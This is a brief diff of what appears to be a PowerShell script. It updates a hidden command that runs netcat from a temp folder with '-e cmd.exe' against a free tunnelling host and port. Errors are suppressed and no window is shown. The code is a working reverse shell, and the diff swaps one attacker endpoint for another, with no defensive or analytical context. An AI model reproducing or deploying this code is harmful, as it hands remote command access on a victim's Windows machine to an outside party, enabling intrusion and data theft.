@@ -19,7 +19,7 @@ try {
 
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("C:\TempVBS\nc.exe tmezp-152-58-178-192.a.free.pinggy.link 37321 -e cmd.exe", 0, $false)
+    $WshShell.Run("C:\TempVBS\nc.exe tngel-103-2-134-199.a.free.pinggy.link 39731 -e cmd.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 1
